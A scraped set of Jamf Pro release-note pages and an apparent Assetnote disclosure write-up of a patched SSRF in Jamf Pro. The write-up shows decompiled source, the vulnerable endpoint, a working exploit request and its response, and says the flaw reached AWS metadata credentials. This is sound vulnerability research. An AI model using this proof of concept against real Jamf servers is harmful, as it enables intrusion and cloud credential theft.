=== Content from www.jamf.com_694e56af_20250115_081523.html ===
   ![](https://media.jamf.com/images/logos/jamf-one-color-dark-for-print-css.svg)         [Skip to main content](#main-content)    [Site Search](https://www.jamf.com/search/)      English

* [English](https://www.jamf.com/resources/product-documentation/jamf-pro-release-notes/)
* [Deutsch (German)](https://www.jamf.com/de/ressourcen/produktdokumentation/jamf-pro-versionshinweise/)
* [Français (French)](https://www.jamf.com/fr/ressources/documentation-produit/notes-de-version-de-jamf-pro/)
* [日本語 (Japanese)](https://www.jamf.com/ja/resources/product-documentation/jamf-pro-release-notes/)
* [繁體中文 (Traditional Chinese)](https://www.jamf.com/zh-tw/resources/product-documentation/jamf-pro-release-notes/)
* [Español (Spanish)](https://www.jamf.com/es/recursos/documentacion-productos/notas-de-publicacion-de-jamf-pro/)
          [Jamf    Home](https://www.jamf.com/)      Toggle Navigation

* [Why Jamf](/why-jamf/)        Why Jamf Meet Jamf: The most complete Apple device management and security solution. [Learn More](/why-jamf/)        Solutions   [Trusted Access](/solutions/trusted-access/)     [Mobile Device Management (MDM)](/solutions/device-management/)     [Identity and access management](/solutions/identity-based-access/)     [Threat prevention and remediation](/solutions/threat-prevention-remediation/)     [Endpoint protection](/solutions/endpoint-protection/)       [Explore all solutions](/solutions/)      Industries   [Business](/business/)     [Education](/education/)     [Healthcare](/healthcare/)
* [Products](/products/)        Products Empower your employees with our best-in-class products. [Learn More](/products/)         [Jamf Pro Device management for business & higher education](/products/jamf-pro/)     [Jamf Now Device management for small & medium-sized businesses](/products/jamf-now/)     [Jamf School Device management for K-12](/products/jamf-school/)       [Jamf Protect Endpoint security & protection](/products/jamf-protect/)     [Jamf Connect Identity & access management](/products/jamf-connect/)     [Jamf Safe Internet Security for education](/products/jamf-safe-internet/)     [Jamf Executive Threat Protection Advanced security](/products/jamf-executive-threat-protection/)
* [Pricing](/pricing/)        Pricing Find the best set of Jamf tools for your budget.        Pricing options   [Business pricing For small business to enterprise](/pricing/)     [Education Pricing For K-12 and Higher Ed](/pricing/education-pricing/)      Try or buy    [Request a trial Free, 14-day Jamf trial](/request-trial/)     [Jamf Store Buy a plan or product today](https://store.jamf.com/1594/purl-catalog)     [From a Partner Find a reseller](/partners/directory/)
* [Resources](/resources/)        Resources Whether you’re looking for education or inspiration, Jamf has you covered with the latest industry and product-specific resources.          [Blog  Get the latest industry insights, news, product updates and more.](https://www.jamf.com/blog/)     [E-books  Thought-provoking content designed to keep you ahead of industry trends.](https://www.jamf.com/resources/e-books/)     [White Papers  Research reports and best practices to keep you informed of Apple management tactics.](https://www.jamf.com/resources/white-papers/)     [Videos  See product demos in action and hear from Jamf customers.](https://www.jamf.com/resources/videos/)       [Case Studies  Apple success stories from those saving time and money with Jamf.](https://www.jamf.com/resources/case-studies/)     [Webinars  On-demand webinar videos covering an array of Apple management topics.](https://www.jamf.com/resources/webinars/)     [Product Documentation  Learn more about our products and what they can do for your organization.](https://www.jamf.com/resources/product-documentation/)
* [Partners](/partners/become-a-partner/)        Partners Current partner, future partner or purchasing from a partner - you’re in the right place.  [Learn More](/partners/)        For partners   [Register a deal](https://partners.jamf.com/)     [Resources](https://partners.jamf.com/English/)     [Training](https://partners.jamf.com/English/)     [Login to Jamf Partner Hub](https://partners.jamf.com/prm/auth/70d5b4b5-6690-4547-85ab-29a39707497d/oauth2/login)       [Explore more](/partners/for-partners/)      **Become a partner**   [MSP](/partners/managed-service-providers/)     [Resellers](/partners/resellers/)     [Integrators](/partners/integrators/)     [Technology](/partners/technology-partners/)       [Explore more](/partners/become-a-partner/)

     [Start Trial](https://www.jamf.com/request-trial/)   [Contact](/contact/)

* [Start Trial](https://www.jamf.com/request-trial/)   [Contact](/contact/)

1. [Jamf    Home](https://www.jamf.com/)
2. [Resources](https://www.jamf.com/resources/)
3. [Product Documentation](https://www.jamf.com/resources/product-documentation/)

* [Start Trial](https://www.jamf.com/request-trial/)

# Jamf Pro Release Notes

    ![](https://media.jamf.com/images/resources/documentation/jamf-pro-release-notes.jpg?q=80&w=400)  ![]()

See what's new, key features, and installation guidelines with Jamf Pro.

The latest version as well as previous versions are available on the Jamf Learning Hub.

 [Read Online](https://learn.jamf.com/bundle/jamf-pro-release-notes-current/page/New_Features_and_Enhancements.html)     Share

* [Share on Facebook](https://www.facebook.com/sharer/sharer.php?u=https://www.jamf.com/resources/product-documentation/jamf-pro-release-notes/)
* [Share on Twitter](https://twitter.com/intent/tweet?url=https://www.jamf.com/resources/product-documentation/jamf-pro-release-notes/)
* [Share on LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https://www.jamf.com/resources/product-documentation/jamf-pro-release-notes/)
* Share via email
           Jamf            English

* [English](https://www.jamf.com/resources/product-documentation/jamf-pro-release-notes/)
* [Deutsch (German)](https://www.jamf.com/de/ressourcen/produktdokumentation/jamf-pro-versionshinweise/)
* [Français (French)](https://www.jamf.com/fr/ressources/documentation-produit/notes-de-version-de-jamf-pro/)
* [日本語 (Japanese)](https://www.jamf.com/ja/resources/product-documentation/jamf-pro-release-notes/)
* [繁體中文 (Traditional Chinese)](https://www.jamf.com/zh-tw/resources/product-documentation/jamf-pro-release-notes/)
* [Español (Spanish)](https://www.jamf.com/es/recursos/documentacion-productos/notas-de-publicacion-de-jamf-pro/)
   Jamf’s purpose is to simplify work by helping organizations manage and secure an Apple experience that end users love and organizations trust. Jamf is the only company in the world that provides a complete management and security solution for an Apple-first environment that is enterprise secure, consumer simple and protects personal privacy. [Learn about Jamf](/about/).     +1 612-605-6625   info@jamf.com
### [Business](/business/)

### [Education](/education/)

### [Healthcare](/healthcare/)

### [The Jamf platform](/solutions/)

* [Zero-touch deployment](/solutions/zero-touch-deployment/)
* [Mobile Device Management (MDM)](/solutions/device-management/)
* [App management](/solutions/app-lifecycle-management/)
* [Inventory management](/solutions/inventory-management/)
* [Self Service](/solutions/self-service/)
* [Identity and access management](/solutions/identity-based-access/)
* [Endpoint protection](/solutions/endpoint-protection/)
* [Threat prevention and remediation](/solutions/threat-prevention-remediation/)
* [Content filtering and safe internet](/solutions/content-filtering/)
* [Zero Trust Network Access (ZTNA)](/solutions/zero-trust-network-access/)
* [Security visibility and compliance](/solutions/compliance/)

### [Business pricing](/pricing/)

### [Education Pricing](/pricing/education-pricing/)

### [Jamf Support](/support/)

* [Jamf Pro](/support/jamf-pro/)
* [Jamf Now](/support/jamf-now/)
* [Jamf School](/support/jamf-school/)
* [Jamf Connect](/support/jamf-connect/)
* [Jamf Protect](/support/jamf-protect/)

### [Services](/services/)

* [Onboarding](/services/onboarding/)
* [Premium Services](/services/premium-services/)
* [Jamf Services Policies](/services/services-policies/)

### [Training](/training/)

* [In-Class](/training/in-class-learning/)
* [Online](/training/online-training/)
* [Training Policies](/training/training-policies/)

### [Store](https://store.jamf.com/)

### [Resources](/resources/)

* [Events](/events/)
* [Blog](/blog/)
* [E-books](https://www.jamf.com/resources/e-books/)
* [Case Studies](https://www.jamf.com/resources/case-studies/)
* [White Papers](https://www.jamf.com/resources/white-papers/)
* [Jamf Threat Labs](/threat-labs/)

### [Partners](/partners/)

* [For partners](/partners/for-partners/)
* [Become a partner](/partners/become-a-partner/)
* [Buy from a partner](/partners/directory/)
* [Marketplace](https://marketplace.jamf.com/)
* [Developers](https://developer.jamf.com/)

### [Products](/products/)

* [Jamf Pro](/products/jamf-pro/)
* [Jamf Now](/products/jamf-now/)
* [Jamf School](/products/jamf-school/)
* [Jamf Connect](/products/jamf-connect/)
* [Jamf Protect](/products/jamf-protect/)
* [Jamf Safe Internet](/products/jamf-safe-internet/)
* [Jamf Executive Threat Protection](https://www.jamf.com/products/jamf-executive-threat-protection/)

### [Integrations](/integrations/)

* [Apple](/integrations/apple/)
* [AWS](/integrations/aws/)
* [Microsoft](/integrations/microsoft/)
* [Google](/integrations/google/)
* [Okta](/integrations/okta/)

### [About](/about/)

* [Leadership](/about/leadership/)
* [Contact](/contact/)
* [News](/about/news/)
* [Press Releases](/about/press-releases/)
* [Careers](/about/careers/)
* [Events](/events/)
* [Investor Relations](https://ir.jamf.com)
* [Media Kit](/about/media-kit/)
* [Trust Center](/trust-center/)
* [Corporate Responsibility](/corporate-responsibility/)
* [Jamf Ventures](/about/jamf-ventures/)
       English

* [English](https://www.jamf.com/resources/product-documentation/jamf-pro-release-notes/)
* [Deutsch (German)](https://www.jamf.com/de/ressourcen/produktdokumentation/jamf-pro-versionshinweise/)
* [Français (French)](https://www.jamf.com/fr/ressources/documentation-produit/notes-de-version-de-jamf-pro/)
* [日本語 (Japanese)](https://www.jamf.com/ja/resources/product-documentation/jamf-pro-release-notes/)
* [繁體中文 (Traditional Chinese)](https://www.jamf.com/zh-tw/resources/product-documentation/jamf-pro-release-notes/)
* [Español (Spanish)](https://www.jamf.com/es/recursos/documentacion-productos/notas-de-publicacion-de-jamf-pro/)
     All contents © copyright 2002-2025 Jamf. All rights reserved.   [Copyright](/copyright-notice/) [Privacy](/trust-center/privacy/) [Terms of Use](/terms-of-use/) [Trust](/trust-center/) [Modern Slavery Act Statement](/modern-slavery-act-statement/)    [Twitter](https://twitter.com/jamfsoftware)   [LinkedIn](https://www.linkedin.com/company/jamf-software/)   [YouTube](https://www.youtube.com/user/JAMFMedia)   [Instagram](https://www.instagram.com/jamfsoftware/)   [Facebook](https://www.facebook.com/jamfsoftware/)                                                                                                                                                     Back to Top

=== Content from docs.jamf.com_d5730f48_20250115_081523.html ===

[Jump to main content](#wh_topic_body)

[![](images/en_JamfLogo-ProductDocumentation-EN.png)](https://www.jamf.com/resources/product-documentation/)

|  | Jamf Pro Release Notes |
| --- | --- |
|  | Version 10.32.0 | [Other Versions](https://www.jamf.com/resources/product-documentation/jamf-pro-release-notes/) |

Search this guide

1. [Home](index.html)
2. [Resolved Issues](Resolved_Issues.html)

* [New Features and Enhancements](New_Features_and_Enhancements.html)
* [Important Notices](Important_Notices.html)
* [System Requirements](System_Requirements.html)
* [Installation](Installation.html)
* [Deprecations and Removals](Deprecations_and_Removals.html)
* [Resolved Issues](Resolved_Issues.html)
* [Product Documentation](Product_Documentation.html)

# Resolved Issues

## Jamf Pro Server: Security Issues

* [PI-006352] This release fixes a security vulnerability with Jamf Pro. It is strongly recommended that you upgrade to Jamf Pro 10.32.0 as soon as possible. This vulnerability has the potential to impact the integrity and availability of your web server. More details will be communicated via email and on Jamf Nation.
* [PI-009748], [PI-009907] This release fixes a security vulnerability involving the URL parameter for UAPI documentation. It is strongly recommended that you upgrade to Jamf Pro 10.32.0 as soon as possible.
* [PI-009921] This release fixes an issue that under certain circumstances caused Jamf Pro account privileges to be incorrectly granted when authenticating using specific sign-on workflows. It is strongly recommended that you upgrade to Jamf Pro 10.32.0 as soon as possible.
* [PI-009928] Fixed an issue that could cause the Jamf Pro server log to generate excessive logging when debug mode was enabled.

## Jamf Pro Server

* [PI-009093] Fixed an issue that caused Jamf Self Service to fail to launch after enrollment if a computer was enrolled via Automated Device Enrollment and took more than approximately one minute to complete the macOS Setup Assistant.
* [PI-009802] Fixed an issue that caused a recurring JSSCache issue regarding Self Service Bookmarks.
* [PI-009867] Fixed an issue that caused performance issues in some circumstances if duplicate data existed in Jamf Pro database reporting tables.
* [PI-009910] Fixed an issue that prevented a computer configuration profile from being created via the Classic API if the profile included the Restrictions payload.
* [PI-009955] Fixed an issue that caused Jamf Pro to perform unnecessary logging when attempting to queue an MDM command that was already queued.
* [PI-010005] Fixed an issue that prevented PreStage Enrollment settings from displaying after upgrading to Jamf Pro 10.31.0 if the settings included the Passcode payload configured in Jamf Pro 10.9.0 or earlier.
* [PI-010078] Fixed an issue that could cause multiple updates to MDM command records to erroneously be executed when a push notification was sent to a device.

[Copyright](Copyright.html)Â Â Â Â Â  [Privacy Policy](https://www.jamf.com/privacy-policy/)[Terms of use](https://www.jamf.com/terms-of-use/)[Security](https://www.jamf.com/security/)Â© Copyright 2002 - 2021 Jamf.All rights reserved.

![]()



=== Content from blog.assetnote.io_d31725de_20250115_081522.html ===
[![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)](/)[Why Assetnote](/why-assetnote)

Platform

What Powers Our Product

[Continuous Asset Discovery

Get an unparalleled view of your environment in real-time](/platform/asset-discovery)[Deep Asset Enrichment

Contextualize and track assets as they evolve](/platform/asset-enrichment)[Assetnote Exposure Engine

Identify high-signal exposures by the hour](/platform/assetnote-exposure-engine)[Expert Security Research

Industry-leading offensive security research at your fingertips](/platform/expert-security-research)

What Empowers Our Customers

[Collaborative Workflows

Work together under one platform](/platform/collaborative-workflows)[Customization

Customize our platform to fit your needs](/platform/customization)

Use Cases

By Objective

[Continuous Asset Discovery and Inventory

Stay up-to-date with your evolving attack surface](/use-cases/continuous-asset-discovery-and-inventory)[Real-Time Exposure Monitoring

Monitor and get high-signal findings](/use-cases/continuous-security-monitoring)[Attack Surface Reduction

Understand the full extent of your attack surface to reduce it](/use-cases/attack-surface-reduction)[Mergers & Acquisitions

Don't inherit exposures of an acquired attack surface](/use-cases/mergers-and-acquisitions)[Bug Bounty Readiness

Find all the low-hanging fruit for a more effective program](/use-cases/bug-bounty-readiness)

By Surface

[Application & Infrastructure

Assetnote covers all traditional EASM surfaces](/use-cases/surface-application-infrastructure)[Cloud Platforms

Assetnote secures the cloud platforms you rely on: AWS, GCP, Azure, and more!](/use-cases/surface-cloud-platforms)[API Security

Assetnote secures the API attack surface as it grows](/use-cases/surface-api-security)

Company[About Us

Learn about who we are and why we do what we do.](/company/about-us)[Careers

Join us in our mission to build awesome security products.](/company/careers)[Contact

Meet with the Assetnote team and get your questions answered.](/company/contact)[Research](/resources/research)[Labs](https://labs.assetnote.io)[ASM Roles](https://asmroles.assetnote.io)[Request a Demo](/demo)[Research Notes](/resources/research)

Security ResearchNovember 30, 2021
# Discovering Full Read SSRF in Jamf (CVE-2021-39303 & CVE-2021-40809)

No items found.![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)Creative Commons license![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a39ee557febfa1ca0b1876_homer-space.jpeg)

*When you hit the AWS metadata IP*

* [Intro](https://blog.assetnote.io/2021/11/30/jamf-ssrf/#intro)
* [What is Jamf Pro?](https://blog.assetnote.io/2021/11/30/jamf-ssrf/#jamf)
* [Mapping out the attack surface](https://blog.assetnote.io/2021/11/30/jamf-ssrf/#mapping)
* [Discovering the SSRF](https://blog.assetnote.io/2021/11/30/jamf-ssrf/#ssrf-discovery)
* [Impact and Response](https://blog.assetnote.io/2021/11/30/jamf-ssrf/#impact-response)
* [Remediation Advice](https://blog.assetnote.io/2021/11/30/jamf-ssrf/#remediation)
* [Conclusion](https://blog.assetnote.io/2021/11/30/jamf-ssrf/#conclusion)

The advisory for this issue can be found [here](https://blog.assetnote.io/2021/11/30/advisory-jamf-ssrf/).

## Intro

When assessing an attack surface, we came across an instance of Jamf Pro installed on premise. To us, when we saw this paradigm of deploying Jamf Pro to the internet and having it externally exposed, our security research team was quite curious about potential vulnerabilities that existed within it.

In particular, we were interested in pre-authentication vulnerabilities, but after spending a huge chunk of time auditing the pre-authentication attack surface, we concluded that a pretty good job had been done at locking this down. Generally, we were impressed that we were not able to find any serious pre-authentication issues, and credit is due to Jamf for this.

However, when looking under the hood at some of the post-authentication functionalities that Jamf Pro had to offer, we discovered a server-side request forgery vulnerability within the Jamf product. This vulnerability also existed in Jamfâs SaaS offering (Jamf cloud) leading to AWS metadata access in Jamfâs account.

The CVEâs associated with the SSRF vulnerabilities discovered in Jamf Pro can be found below:

* [PI-006352] CVSS 8.3 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39303>
* [PI-009921] CVSS 7.5 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40809>

## What is Jamf Pro

Jamf Pro is an application used by system administrators to configure and automate IT administration tasks for macOS, iOS, iPadOS, and tvOS devices. Jamf offers on-premises and cloud-based mobile device management.

There are two deployment options for Jamf Pro, cloud (SaaS) and on-premise. In order to do this research, we obtained a copy of Jamf Pro on-premise.

Jamf Pro is one of the most popular MDM solutions for Apple products, and hence it was an attractive target to do source code analysis and vulnerability research on.

## Mapping out the attack surface

We went through every route defined in the <span class="code\_single-line">web.xml</span> file systematically and ruled out all of the pre-authentication attack surface. After doing this exercise and not discovering any serious issues, our team looked for sinks that could lead to dangerous functionality and then reverse engineered their way back up to the source. This proved to be a very effective mechanism when finding dangerous functionality inside Jamf regardless of whether or not authentication was required.

Due to our previous experiences with large enterprise products and SSRF, we decided to pinpoint what HTTP clients were in use by Jamf and then find all references to these HTTP clients. When auditing enterprise software, it is not uncommon to find a HTTP client wrapper that is used by the rest of the code base. This was the case for Jamf, where we found a HTTP client defined in <span class="code\_single-line">jamf.war.src/WEB-INF/classes/com/jamfsoftware/jss/utils/HTTPUtils.java</span>:

```

/*     */   public static ResponseBytes getBytesFromSSLMutualAuthEndpoint(String sslEndpoint, KeyManagerProvider keyManagerProvider, TrustManagerProvider trustManagerProvider) throws SSLEndpointException {
/*     */     SSLContext sslContext;
/*     */     ResponseBytes bytes;
/*     */     try {
/*  93 */       sslContext = SSLContext.getInstance("TLS");
/*  94 */       sslContext.init((keyManagerProvider == null) ? null : keyManagerProvider.getKeyManagers(), (trustManagerProvider == null) ? null : trustManagerProvider.getTrustManagers(), null);
/*  95 */     } catch (GeneralSecurityException e) {
/*  96 */       throw new SSLEndpointException(e);
/*     */     }
/*     */
/*  99 */     SSLConnectionSocketFactory sslsf = new SSLConnectionSocketFactory(sslContext);
/*     */
/* 101 */     HttpGet httpGet = new HttpGet(sslEndpoint);
/*     */
/*     */
/*     */     try {
/* 105 */       bytes = getBytes(sslEndpoint, sslsf, httpGet);
/* 106 */     } catch (Exception e) {
/* 107 */       throw new SSLEndpointException(e);
/*     */     }
/* 109 */     return bytes;
/*     */   }
/*     */
/*     */
/*     */
/*     */   private static ResponseBytes getBytes(String sslEndpoint, SSLConnectionSocketFactory sslsf, HttpGet httpGet) throws IOException, HttpException {
/* 115 */     CloseableHttpClient httpClient = HttpClients.custom().setSSLSocketFactory((LayeredConnectionSocketFactory)sslsf).build();
/*     */
/* 117 */     ResponseBytes bytes = new ResponseBytes();
/*     */     try {
/* 119 */       CloseableHttpResponse response = httpClient.execute((HttpUriRequest)httpGet);
/*     */       try {
/* 121 */         HttpEntity entity = response.getEntity();
/* 122 */         bytes.setBytes(EntityUtils.toByteArray(entity));
/* 123 */         bytes.setStatusCode(response.getStatusLine().getStatusCode());
/*     */       } finally {
/* 125 */         response.close();
/*     */       }
/*     */     } finally {
/* 128 */       httpClient.close();
/*     */     }
/* 130 */     return bytes;
/*     */   }
/*     */

As the source code suggests, the <span class="code_single-line">getBytes</span> function was the sink which was responsible for making the HTTP request.

With this in mind, we were able to discover numerous SSRF vulnerabilities that were possible to trigger once authenticated to Jamf. For this blog post, we will focus on the SSRF that had the most impact.

## Discovering the SSRF

Simply searching the entire code base for <span class="code_single-line">getBytesFromSSLMutualAuthEndpoint</span>, returned a single result in <span class="code_single-line">jamf.war.src/WEB-INF/classes/com/jamfsoftware/jss/edu/EducationStudentPhotoRepositoryImpl.java</span>:

```

/*     */   public EducationStudentPhotoRepository.ImageRetrievalData getBase64EncodedImageWithoutClientAuth(String url) {
/* 130 */     return getImage(url, null);
/*     */   }
/*     */   private EducationStudentPhotoRepository.ImageRetrievalData getImage(String url, KeyManagerProvider clientKeyManagerProvider) {
/*     */     HTTPUtils.ResponseBytes bytes;
/* 134 */     EducationStudentPhotoRepository.ImageRetrievalData.Builder dataBuilder = EducationStudentPhotoRepository.ImageRetrievalData.builder();
/*     */
/*     */
/*     */
/*     */     try {
/* 139 */       TrustManagerProvider tmp = getTrustManagerProvider();
/*     */
/* 141 */       bytes = HTTPUtils.getBytesFromSSLMutualAuthEndpoint(url, clientKeyManagerProvider, tmp);
/* 142 */     } catch (Exception e) {
/* 143 */       this.jamfLog.error("Error retrieving image for url " + url, e);
/* 144 */       return dataBuilder.setErrorMsg(UIErrorMessage.fromException(e).getMessage()).build();
/*     */     }
/*     */
/* 147 */     if (!HTTPUtils.is200Response(bytes.getStatusCode())) {
/* 148 */       this.jamfLog.error("Unable to load image at " + url + ", HTTP Status Code: " + bytes.getStatusCode());
/* 149 */       return dataBuilder.setErrorMsg(UIErrorMessage.fromStatusCode(bytes.getStatusCode()).getMessage()).build();
/*     */     }
/*     */
/* 152 */     if (!url.startsWith("https")) {
/* 153 */       dataBuilder.setErrorMsg(UIErrorMessage.INSECURE_HOST.getMessage());
/*     */     }
/*     */
/* 156 */     dataBuilder.setImage(Base64.encodeBase64String(bytes.getBytes()));
/* 157 */     return dataBuilder.build();
/*     */   }

In order to trace this function back to the source, we identified all usages of <span class="code_single-line">getBase64EncodedImageWithoutClientAuth</span> and discovered the following snippet of code in <span class="code_single-line">jamfsoftware/jss/edu/settings/EduFeatureSettingsTestHTMLResponse.java</span>:

```

/*     */   public ResponseStatus respondToAJAXRequest(Document xmldoc, Element root) {
/*  78 */     if ("ACTION_AJAX_REQUEST_PHOTO".equals(this.ajaxAction)) {
/*  79 */       EducationStudentPhotoRepositoryImpl photoRepo = new EducationStudentPhotoRepositoryImpl();
/*  80 */       String sslEndpoint = this.request.getParameter("imageUrl");
/*  88 */       EducationStudentPhotoRepository.ImageRetrievalData data = photoRepo.getBase64EncodedImageWithoutClientAuth(sslEndpoint);
/*     */
/*  90 */       if (data.retrievedImageWithoutError()) {
/*  91 */         XMLUtils.addErrorToXML(xmldoc, root, "base64Image", EducationStudentPhotoRepositoryImpl.UIErrorMessage.CLIENT_AUTH_NOT_ENABLED.getMessage());
/*     */       } else {
/*  93 */         data = photoRepo.getBase64EncodedImage(sslEndpoint);
/*     */       }
/*     */
/*  96 */       data.addImageAndErrors(xmldoc, root);
/*     */
/*  98 */       return ResponseStatus.REQUEST_PROCESSED_SUCCESSFULLY;
/*     */     }
/* 100 */     return ResponseStatus.BAD_REQUEST;
/*     */   }

Thankfully, it was quite easy to discover the affected endpoints due to hints in the codebase as to where this functionality existed:

```

/*     */   public EduFeatureSettingsTestHTMLResponse() {
/*  25 */     this.respondToURI = "eduFeatureSettingsTest.html";
/*  26 */     this.redirectParentURI = (new EduFeatureSettingsHTMLResponse()).getRespondToURI() + "?id=0&o=r";
/*     */
/*  28 */     this.includePageListObjects = "";
/*  29 */     this.includePageCRUDForObject = "eduFeatureSettingsTest.jsp";
/*     */
/*  31 */     this.targetObject = (CRUDObject)new EduFeatureSettings();
/*     */
/*  33 */     this.parentTabURI = "settings.html";
/*  34 */     this.selectedSideNavigationURI = "settings.html?mobileDevice";
/*     */
/*  36 */     this.primaryResponderForCrudObject = false;
/*     */   }

So, piecing it all together, we were able to exploit this SSRF by visiting the following URL as an authenticated user:

<span class="code_single-line">http://yourjamfinstance:8090/eduFeatureSettingsTest.html</span>

This resulted in a form that looked something like this:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a39ee58fbe31264ae640ac_edutest.png)

Sure, Iâll enter a URL in

Upon submitting this form with the URL <span class="code_single-line">http://example.com</span>, the following HTTP request was made:

```

POST /eduFeatureSettingsTest.ajax?id=0&o=r HTTP/1.1
Host: jamfpro:8080
Content-Length: 117
Accept: */*
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://re.local:8090
Referer: http://re.local:8090/legacy/eduFeatureSettingsTest.html?id=0&o=r
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=NGQwZDlkODQtZmY4MS00NjI3LTk5MGUtODA1MDg0NmRhZmY4
Connection: close

imageUrl=http%3A%2F%2Fexample.com&ajaxAction=ACTION_AJAX_REQUEST_PHOTO&session-token=dQcHUw2h9CF1QvoG5Q6lqBLawNEsxPuu

The full HTTP response for the requested URL can be found in the <span class="code_single-line">base64Image</span> XML tag, from the response of the Jamf Server:

```

HTTP/1.1 200
X-FRAME-OPTIONS: SAMEORIGIN
Cache-Control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0
Expires: 0
Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: post-check=0, pre-check=0
Pragma: no-cache
sessionExpiresEpoch: 1800
Date: Tue, 17 Aug 2021 13:09:14 GMT
Connection: close
Content-Length: 1959

<?xml version="1.0" encoding="UTF-8"?><jss>
<base64Image>PCFkb2N0eXBlIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5FeGFtcGxlIERvbWFpbjwvdGl0bGU+CgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiIC8+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSIgLz4KICAgIDxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CiAgICBib2R5IHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjBmMGYyOwogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAwOwogICAgICAgIGZvbnQtZmFtaWx5OiAtYXBwbGUtc3lzdGVtLCBzeXN0ZW0tdWksIEJsaW5rTWFjU3lzdGVtRm9udCwgIlNlZ29lIFVJIiwgIk9wZW4gU2FucyIsICJIZWx2ZXRpY2EgTmV1ZSIsIEhlbHZldGljYSwgQXJpYWwsIHNhbnMtc2VyaWY7CiAgICAgICAgCiAgICB9CiAgICBkaXYgewogICAgICAgIHdpZHRoOiA2MDBweDsKICAgICAgICBtYXJnaW46IDVlbSBhdXRvOwogICAgICAgIHBhZGRpbmc6IDJlbTsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmRmZGZmOwogICAgICAgIGJvcmRlci1yYWRpdXM6IDAuNWVtOwogICAgICAgIGJveC1zaGFkb3c6IDJweCAzcHggN3B4IDJweCByZ2JhKDAsMCwwLDAuMDIpOwogICAgfQogICAgYTpsaW5rLCBhOnZpc2l0ZWQgewogICAgICAgIGNvbG9yOiAjMzg0ODhmOwogICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgIH0KICAgIEBtZWRpYSAobWF4LXdpZHRoOiA3MDBweCkgewogICAgICAgIGRpdiB7CiAgICAgICAgICAgIG1hcmdpbjogMCBhdXRvOwogICAgICAgICAgICB3aWR0aDogYXV0bzsKICAgICAgICB9CiAgICB9CiAgICA8L3N0eWxlPiAgICAKPC9oZWFkPgoKPGJvZHk+CjxkaXY+CiAgICA8aDE+RXhhbXBsZSBEb21haW48L2gxPgogICAgPHA+VGhpcyBkb21haW4gaXMgZm9yIHVzZSBpbiBpbGx1c3RyYXRpdmUgZXhhbXBsZXMgaW4gZG9jdW1lbnRzLiBZb3UgbWF5IHVzZSB0aGlzCiAgICBkb21haW4gaW4gbGl0ZXJhdHVyZSB3aXRob3V0IHByaW9yIGNvb3JkaW5hdGlvbiBvciBhc2tpbmcgZm9yIHBlcm1pc3Npb24uPC9wPgogICAgPHA+PGEgaHJlZj0iaHR0cHM6Ly93d3cuaWFuYS5vcmcvZG9tYWlucy9leGFtcGxlIj5Nb3JlIGluZm9ybWF0aW9uLi4uPC9hPjwvcD4KPC9kaXY+CjwvYm9keT4KPC9odG1sPgo=</base64Image>
<ERRORS>
<ERROR>
<ERROR_FIELD>base64Image</ERROR_FIELD>
<ERROR_TEXT>The distribution point URL should begin with "https://"</ERROR_TEXT>
</ERROR>
</ERRORS>
<sessionExpiresEpoch>1800</sessionExpiresEpoch>
</jss>

Upon decoding the Base64, the full contents of the request to <span class="code_single-line">http://example.com</span> is returned:

```

<!doctype html>
<html>
<head>
    <title>Example Domain</title>
... ommitted for brevity ...
## Impact and Response

While a post-authentication SSRF does not sound that exciting, since Jamf offer a cloud version of their software hosted on AWS, server-side request forgery vulnerabilities can have critical impact.

In this case, through the SSRF demonstrated in this blog post, it was possible to access the AWS metadata IP address and obtain temporary security credentials to Jamfâs AWS environment. After proving the concept of obtaining the AWS credentials for my own Jamf cloud instance, incident response kicked off on Jamfâs side.

Jamfâs AWS monitoring tools noticed the anomalous behaviour and an investigation was started. Their team recognized it was an SSRF after inspecting it and the IP address doing the behaviour was blocked. The Jamf Pro instance that the exploit was performed on was also disabled.

Until a more robust fix was in place, Jamf employed a web application firewall (WAF) rule that effectively blocked exploitation for all of Jamf cloud. A fix was merged into Jamf Pro RC within 3 days of exploitation.

Jamf have a well defined vulnerability disclosure process that we used to submit the vulnerability. They were responsive and gave the vulnerability the due dilligence necessary and worked on a fix very quickly. As a company, Jamf also enabled and encouraged disclosure of this issue.

## Remediation Advice

This vulnerability was patched in Jamf 10.32.

Please find the detail about this Jamf release here: <https://community.jamf.com/t5/jamf-pro/what-s-new-in-jamf-pro-10-32-release/m-p/246505>.

In order to remediate this vulnerability, we recommend upgrading to the latest version of Jamf Pro on premise.

## Conclusion

Often when assessing source code, it is important to focus on certain classes of issues and be as holistic as possible. While no pre-authentication vulnerabilities were found, serious vulnerabilities were discovered in Jamf Pro by focusing on a specific bug class (SSRF) and by tracing the vulnerability in a reverse fashion (sink to source).

